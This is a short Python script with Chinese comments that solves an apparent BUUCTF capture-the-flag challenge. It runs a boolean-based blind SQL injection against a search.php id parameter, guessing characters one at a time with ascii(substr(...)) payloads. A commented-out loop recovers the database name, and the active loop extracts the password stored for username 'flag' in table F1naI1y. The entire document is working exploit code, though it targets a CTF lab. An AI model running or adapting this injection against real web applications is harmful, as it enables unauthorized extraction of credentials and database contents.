import requests
import time

# url是随时更新的，具体的以做题时候的为准
url = 'http://050d49e0-3413-4b9c-804d-94fdf635becb.node4.buuoj.cn:81/search.php?id='
table=""
database=""
flag = "Not this"
# subs=1
# while True:
#     payload = "''or(ascii(substr((database()),{0},1))={1})"
#     targetUrl=url+payload
#     for c in range(33,128):
#         res=requests.get(targetUrl.format(subs,c))
#         if flag in res.text:
#             database+=chr(c)
#             print(database)
#     subs+=1
subs=1
while True:
    payload = "''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),{0},1))={1})"
    targetUrl = url + payload
    # c表示33~127位ASCII中可显示字符
    for c in range(33, 128):
        res = requests.get(targetUrl.format(subs, c))
        if flag in res.text:
            table += chr(c)
            print(table)
            # break
    subs+=1
    time.sleep(0.05)

